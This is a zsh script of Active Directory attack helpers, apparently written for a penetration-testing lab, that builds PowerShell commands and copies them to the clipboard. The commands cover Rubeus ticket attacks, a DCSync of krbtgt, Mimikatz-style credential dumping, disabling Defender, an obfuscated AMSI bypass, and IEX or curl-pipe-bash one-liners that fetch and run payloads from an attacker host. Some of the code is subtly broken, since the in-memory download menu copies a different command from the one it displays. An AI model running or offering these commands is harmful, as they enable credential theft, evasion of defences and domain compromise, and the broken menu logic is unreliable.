#!/usr/bin/env zsh

############################################################# 
# nb-ad-pwsh
#############################################################
nb-ad-pwsh-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-pwsh
------------
The nb-ad-pwsh namespace contains commands for powershell/powerviwe commands to copy/paste to a windows machine.

PowerView Enumeration
---------------------
nb-ad-pwsh-enum-domain         PowerView domain enumeration commands
nb-ad-pwsh-enum-userhunt       PowerView user session hunting enumeration commands
nb-ad-pwsh-enum-users          PowerView user and computer enumeration commands
nb-ad-pwsh-enum-acls           Powerview ACLs rights enumeration like kerberoasts, DCsync etc.

Lateral Movement
----------------
nb-ad-pwsh-psremoting          connect via PSRemoting to a target host
nb-ad-pwsh-av-bypass           AV evasion powershell commands
nb-ad-pwsh-file-download       select one of general commands to download a payload into a target machine
nb-ad-pwsh-dump-secrets        dump secrets on windows machine using Invoke-Mimi.ps1

Domain Privilege Escalation
---------------------------
nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus
nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
nb-ad-pwsh-kerberoasting       kerberoasting
nb-ad-pwsh-unconstrained       unconstrained delegation
nb-ad-pwsh-constrained         constrained delegation
nb-ad-pwsh-rbcd                resource-based constrained delegation

Privilege Escalation to Enterprise Admins
-----------------------------------------
nb-ad-pwsh-trust-tickets       across trusts - child to parent using trust tickets
nb-ad-pwsh-krbtgt-hash         across trusts - child to parent using krbtgt hash

Domain Persistence
------------------
nb-ad-pwsh-persist-dcsync      add dcsync rights to a user
nb-ad-pwsh-persist-golden      create a golden ticket
nb-ad-pwsh-persist-silver      create a silver ticket
nb-ad-pwsh-persist-diamond     create a diamond ticket
nb-ad-pwsh-persist-skeleton    create a skeleton key
nb-ad-pwsh-persist-dsrm        persistence through DSRM

Misc
----
nb-ad-cmd-winrs                connect via winrs to a target host
nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell
nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows

DOC
}

nb-ad-pwsh-unconstrained() {
    __check-project
    __warn "NOTE: the prerequisite for elevation using unconstrained delegation is having admin access shell to the machine."
    echo
    __info "You can check which machine allows for unconstrained delegation with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo
    __warn "First encode the following command with: .\\ArgSplit.bat:"
    __ok "monitor"
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"
    echo
    __ask "Enter the DC's hostname"
    nb-vars-set-rhost
    nb-vars-set-lhost
    nb-vars-set-domain
    echo
    __ask "Enter the listening machine hostname"
    local ma && __askvar ma HOSTNAME

    __COMMAND=".\\\\Loader.exe -path http://${__LHOST}/Rubeus.exe -args %Pwn% /targetuser:${__RHOST}$ /interval:5 /nowrap C:\\\\Users\\\\Public\\\\Rubeus.exe monitor /targetuser:${__RHOST}$ /interval:5 /nowrap"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    __info "Next you need to use command to force authentication to of the DC to the listener machine:"
    __COMMAND2=".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
    __ok "$__COMMAND2"
}

nb-ad-pwsh-enum-acls() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView check for domain PrivEsc vectors:"
    echo "1. Kerberoast"
    echo "2. Targeted kerberoasting - SET SPN"
    echo "3. Check if user has DCSync rights"
    echo "4. Unconstrained delegation"
    echo "5. Constrained delegation for user"
    echo "6. Constrained delegation for machine"
    echo "7. Resource-based constrained delegation"
    echo "8. AS-REP Roast"
    echo "9. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) 
          echo
          __info "Check kerberoastable users"
          __COMMAND="Get-DomainUser -SPN";;
        2) 
          echo
          __info "Enumerate the permissions for RDPUsers on ACLs"
          __COMMAND="Find-InterestingDomainAcl -ResolveGUIDs | ?{\$_.IdentityReferenceName -match \"RDPUsers\"}";;
        3) 
          echo
          __ask "Enter user to check for DCsync rights"
          nb-vars-set-user
          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
          local dn && __askvar dn DN
          __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
          ;;
        4)
          echo
          __info "Check which machine allows for unconstrained delegeation"
          __COMMAND="Get-DomainComputer -Unconstrained | select -ExpandProperty name";;
        5) 
          echo
          __info "Enumerate users in the domain for whom Constrained Delegation is enabled"
          __COMMAND="Get-DomainUser -TrustedToAuth";;
        6) 
          echo
          __info "Enumerate computer accounts in the domain for which Constrained Delegation is enabled"
          __COMMAND="Get-DomainComputer -TrustedToAuth";;
        7) 
          echo
          nb-vars-set-user
          echo
          __info "Find a computer object in dcorp domain where we have Write permissions"
          __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match '${__USER}'}";;
        8) 
          echo
          __info "Enumerate accounts with Kerberos Preauth disabled"
          __COMMAND="Get-DomainUser -PreauthNotRequired -Verbose";;
        9) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-acls; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __ok "$__COMMAND"
}

nb-ad-pwsh-dcsync() {
    __check-project
    __info "You can check if user has DCSync rights with command:"
    __ok "nb-ad-pwsh-enum-acls"
    echo

    __warn "First encode the following command with: .\\ArgSplit.bat:"
    __ok "lsadump::dcsync"
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\krbtgt\" \"exit\""

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-opth() {
    __check-project
    nb-vars-set-user
    __ask "Enter AES256 version of the hash"
    __check-hash

    __warn "First encode the following command with: .\\ArgSplit.bat:"
    __ok "asktgt"
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-ptt() {
    __check-project

    __warn "First encode the following command with: .\\ArgSplit.bat:"
    __ok "ptt"
    __ask "Then check the encoded command with:"
    __ok "echo %Pwn%"

    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket:"

    echo "$__COMMAND" | wl-copy
    echo
    __info "Enter the base64-encoded ticket in place of /ticket"
    __info "Run from elevated shell:"
    __ok "$__COMMAND"
}

nb-ad-pwsh-enum-users() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView Users and Computers Enumeration Commands:"
    echo "1. Get the description field from the users"
    echo "2. List all computers and their OS versions"
    echo "3. List all users"
    echo "4. List member computers in the domain"
    echo "5. List members of the Domain Admins group"
    echo "6. List members of the Enterprise Admins group"
    echo "7. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Get-NetUser | Select-Object samaccountname,description";;
        2) __COMMAND="Get-NetComputer | select samaccountname, operatingsystem, operatingsystemversion";;
        3) __COMMAND="Get-DomainUser | select -ExpandProperty samaccountname";;
        4) __COMMAND="Get-DomainComputer | select -ExpandProperty dnshostname";;
        5) __COMMAND="Get-DomainGroupMember -Identity \"Domain Admins\"";;
        6) __COMMAND="Get-DomainGroupMember -Identity \"Enterprise Admins\" -Domain moneycorp.local";;
        7) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-users; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-users
}

nb-ad-pwsh-enum-userhunt() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView User Hunting Commands:"
    echo "1. Find all the local admin accounts on all the machines (Required Admin rights on non-DC machines)"
    echo "2. Find Local Admin sessions for the current user"
    echo "3. Find Local Admin sessions with PSRemoting for the current user"
    echo "4. Find Domain Admin sessions for the current user"
    echo "5. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin";;
        2) __COMMAND="Find-LocalAdminAccess";;
        3) nb-vars-set-domain
          __COMMAND=". C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess -Domain ${__DOMAIN} -Verbose"
          ;;
        4) __COMMAND="Find-DomainUserLocation";;
        5) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-userhunt; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-userhunt
}

nb-ad-pwsh-enum-domain() {
    clear

    __warn "Load PowerView with:"
    __ok ". .\\PowerView.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "PowerView Domain Enumeration Commands:"
    echo "1. Get current domain"
    echo "2. Get Domain SID for the current domain"
    echo "3. Get information of the Domain Controller"
    echo "4. Return to previous menu"
    echo
    echo -n "Choose a command to copy: "
    read choice

    case $choice in
        1) __COMMAND="Get-NetDomain";;
        2) __COMMAND="Get-DomainSID";;
        3) __COMMAND="Get-NetDomainController";;
        4) return;;
        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-domain; return;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard:"
    __ok "$__COMMAND"
    echo
    sleep 1
    nb-ad-pwsh-enum-domain
}

nb-ad-pwsh-dump-secrets() {
    clear

    __warn "Load Invoke-Mimi with:"
    __ok ". .\\Invoke-Mimi.ps1"
    __ok "nb-pwsh-file-download    - Execute in memory"

    echo
    __ask "Choose a command to copy:"
    echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
    echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
    echo
    echo -n "Choice: "
    read choice

    case $choice in
        1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
        2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
        3) exit;;
        *) echo "Invalid option"; exit;;
    esac

    echo "$__COMMAND" | wl-copy
    __info "Command copied to clipboard"
    __ok "$__COMMAND"
}

nb-ad-pwsh-file-download() {
    __warn "If you're not in powershell session and use powershell command, prepend it with powershell -c"
    echo
    nb-vars-set-lhost
    nb-vars-set-lport
    local filename && __askvar filename "FILENAME"

    __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
    local down && __askvar down "DOWNLOAD_OPTION"

    case $down in
        d)
            # Commands for downloading to disk
            __ask "Choose a command to copy:"
            echo "1. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
            echo "2. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
            echo "3. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
            echo "4. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
            echo "5. Previous menu"
            echo
            echo -n "Choice: "
            read choice

            case $choice in
                1) __COMMAND="iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
                2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
                4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                5) exit;;
                *) echo "Invalid option"; exit;;
            esac
            ;;
        e)
            # Commands for downloading and executing in memory
            __ask "Choose a command to copy:"
            echo "1. IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
            echo "2. IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
            echo "3. curl http://${__LHOST}:${__LPORT}/$filename | bash"
            echo "4. Previous menu"
            echo
            echo -n "Choice: "
            read choice

            case $choice in
                1) __COMMAND="IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
                2) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
                3) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
                4) exit;;
                *) echo "Invalid option"; exit;;
            esac
            ;;
        *)
            echo "Invalid action choice"; exit;;
    esac

    echo "$__COMMAND" | wl-copy

    __info "Run the shell using command:"
    __ok "  Start-Process \"shell-name.exe\""
}

nb-ad-pwsh-psremoting() {
    __check-project
    __ask "Enter the hostname of a target machine"
    nb-vars-set-rhost

    __ask "Do you want to connect or check access to the machine (l/c)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "l" ]]; then
      __COMMAND="Enter-PSSession -ComputerName ${__RHOST}"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard"
      __ok "$__COMMAND"
      echo
      __info "Situational awareness:"
      __ok "\$env:username"
      __ok "\$env:computername"
    elif [[ $login == "c" ]]; then
      __COMMAND="Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName ${__RHOST}"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard"
      __ok "$__COMMAND"
    else
      echo
      __err "Invalid option. Please choose 'l' for login or 'c' for checking access."
    fi
}

nb-ad-cmd-winrs() {
    __check-project
    __ask "Enter the hostname of a target machine"
    nb-vars-set-rhost

    __ask "Do you want to connect or check access to the machine (l/c)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "l" ]]; then
      __COMMAND="winrs -r:${__RHOST} cmd"
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard:"
      __ok "$__COMMAND"
      echo
      __info "Situational awareness:"
      __ok "set username"
      __ok "set computername"
    elif [[ $login == "c" ]]; then
      __COMMAND="winrs -r:${__RHOST} cmd /c \"set computername && set username\""
      echo $__COMMAND | wl-copy
      __info "Command copied to clipboard"
    else
      echo
      __err "Invalid option. Please choose 'l' for login or 'c' for checking access."
    fi
}

nb-ad-cmd-ping() {
    __ask "Network with subnet ex. 10.0.0.0/23"
    local sb && __askvar sb NETWORK_SUBNET

    __info "Use the following command in windows cmd:"
    __ok "for /L %i in (1 1 254) do ping $sb.%i -n 1 -w 100"
}

nb-ad-pwsh-ping() {
    __ask "Network with subnet ex. 10.0.0.0/23"
    local sb && __askvar sb NETWORK_SUBNET

    __info "Use the following command in windows powershell:"
    __ok "1..254 | % {\"172.16.5.\$(\$_): \$(Test-Connection -count 1 -comp \"$sb\".\$(\$_) -quiet)\"}"
}

nb-ad-pwsh-av-bypass() {
    # Display menu
    __ask "Choose a command to copy:"
    echo "1) Bypass the execution policy"
    echo "2) Disable AV using powershell (Requires Local Admin rights)"
    echo "3) Bypass enhanced script block logging so that AMSI bypass is not logged"
    echo "4) Bypass AMSI Check (If Admin rights are not available)"
    echo "5) Previous menu"
    echo
    echo -n "Choice: "
    read -r choice

    case $choice in
        1) 
          __COMMAND="powershell -ep Bypass"
          ;;
        2) 
          __COMMAND="Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring \$true
Set-MPPreference -DisableIOAVProtection \$true
Set-MPPreference -DisableIntrusionPreventionSystem \$true"
          ;;
        3)
          # Set LHOST and LPORT variables using existing functions
          nb-vars-set-lhost
          nb-vars-set-lport
          __COMMAND="iex (iwr http://${__LHOST}:${__LPORT}/sbloggingbypass.txt -UseBasicParsing)"
          ;;
        4) 
          __COMMAND="S\`eT-It\`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI\`A\`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A\`ss\`Embly\".\"GET\`TY\`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g\`etf\`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE\`T\`VaLUE\"(  \${n\`ULl},\${t\`RuE} )"
          ;;
        5) 
          return
          ;;
        *) 
          echo "Invalid option"
          return
          ;;
    esac

    # Copy the command to clipboard
    echo "$__COMMAND" | wl-copy
    __ok "Command copied to clipboard."
}
